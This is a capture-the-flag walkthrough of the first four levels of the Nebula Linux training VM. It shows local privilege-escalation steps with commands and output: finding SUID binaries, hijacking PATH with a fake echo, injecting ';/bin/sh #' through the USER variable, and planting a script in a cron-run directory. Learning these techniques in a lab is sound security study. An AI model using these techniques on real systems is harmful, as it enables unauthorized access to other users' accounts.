# Exploit Education - Nebula

This is a walkthrough of [Nebula](http://exploit.education/nebula/) from [Exploit Education](http://exploit.education/).  

Nebula is a Linux virtual machine designed to demonstrate a number of weaknesses and vulnerabilities in Linux. 

## Setup
To run these tasks I use VirtualBox. The virtual machine has 1 GiByte of RAM, no virtual hard drive and network set to Host Only Adapter. The Nebula ISO image is attached and on startup the Live Image is selected from the boot menu. Once presented with a prompt login with username and password of 'nebula'. Then run `ifconfig` to get the IP address of the virtual machine.  

With the virtual machine running I log into each level using `ssh`:
```
$ ssh levelnn@NEBULA_VM_IP_ADDRESS
```
The username and password for each level take  the form 'levelnn' where nn is the number of the level. The aim of each level is to be able to run the `getflag` command to under the 'flagnn' account.

## Levels
[Level 00](#level-00)  
[Level 01](#level-01)  
[Level 02](#level-02)  
[Level 03](#level-03)  

### Level 00

[Level 00 Description](https://exploit.education/nebula/level-00/)  

First of all we use `find` to find any SUID applications that we can run.
```
level00@nebula:~$ find / -type f -perm -u+s 2>/dev/null
```
In amoungst the find result we see:
```
...
/rofs/bin/.../flag00
...
level00@nebula:~$ ls -al /rofs/bin/.../flag00 
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
```
Try and run the `flag00` application.
```
level00@nebula:~$ /rofs/bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ 
```
The application has given us a shell as the flag00 user. We can now run `getflag`
```
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```
### Level 01

[Level 01 Description](https://exploit.education/nebula/level-01/)

From inspection of the source code attached to the description we can see that the `flag01` program uses the `system()` function to call `echo` and write 'and now what?' to stdout. 
```
level01@nebula:~$ ls -al /home/flag01
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
level01@nebula:~$ /home/flag01/flag01
and now what?
```
`flag01` is an SUID application therefore it will run any commands as the flag01 user. The absolute path of `echo` isn't set therefore we can create a fake echo command to give us a shell under the flag01 account.  

To do this we simply create a one line script in `/tmp/echo` which just runs `/bin/bash`. We give the script execute permissions and and /tmp to the PATH.
```
level01@nebula:~$ echo /bin/bash > /tmp/echo 
level01@nebula:~$ chmod +x /tmp/echo
level01@nebula:~$ export PATH=/tmp:$PATH
```
Now when we run `flag01` we drop into a shell under the flag01 account and we can run `getflag`.
```
level01@nebula:~$ /home/flag01/flag01 
flag01@nebula:~$ getflag
You have successfully executed getflag on a target account
```
### Level 02

[Level 02 Description](https://exploit.education/nebula/level-02/)

From inspection of the source code attached to the description we can see that the `flag02` program uses fills a buffer with a command which is then executed by the `system()` function. The command uses `echo` to print the USER environment variable. We can modify the USER variable to manipulate the command to give use a shell.

Initial experimentation:
```
level02@nebula:~$ cd /home/flag02
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo level02 is cool")
level02 is cool
```
Initial attempt at changing the USER variable:
```
level02@nebula:/home/flag02$ USER=/bin/sh ./flag02
about to call system("/bin/echo /bin/sh is cool")
/bin/sh is cool
level02@nebula:/home/flag02$ USER=/bin/sh; ./flag02
about to call system("/bin/echo /bin/sh is cool")
/bin/sh is cool
```
Success!
```
level02@nebula:/home/flag02$ USER=';/bin/sh #' ./flag02
about to call system("/bin/echo ;/bin/sh # is cool")

sh-4.2$ #
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
### Level 03

[Level 03 Description](https://exploit.education/nebula/level-03/)

Initial iscpection of /home/flag03 shows that there is a script called `writeable.sh` and a directory called `writeable.d` in /home/flag03. 
```
level03@nebula:~$ ls
level03@nebula:~$ ls /home/flag03
writable.d  writable.sh
```
`writable.sh` is the cron task. It executes any scripts in the directory `writeable.d` and then deletes the file. 

We can create a short script that will call `getflag` and place it in `writeable.d`. The script will run under the flag03 account so getting the flag will succeed.
```
level03@nebula:~$ echo 'getflag > /tmp/flag.out' > script.sh
level03@nebula:~$ cp script.sh /home/flag03/writable.d
```
A few minutes later...
```
level03@nebula:~$ ls -al /tmp/
total 4
drwxrwxrwt 4 root   root   100 2021-03-28 01:27 .
drwxr-xr-x 1 root   root   220 2021-03-28 01:20 ..
-rw-rw-r-- 1 flag03 flag03  59 2021-03-28 01:27 flag.out
drwxrwxrwt 2 root   root    40 2021-03-28 01:20 .ICE-unix
drwxrwxrwt 2 root   root    40 2021-03-28 01:20 .X11-unix
level03@nebula:~$ cat /tmp/flag.out 
You have successfully executed getflag on a target account
```
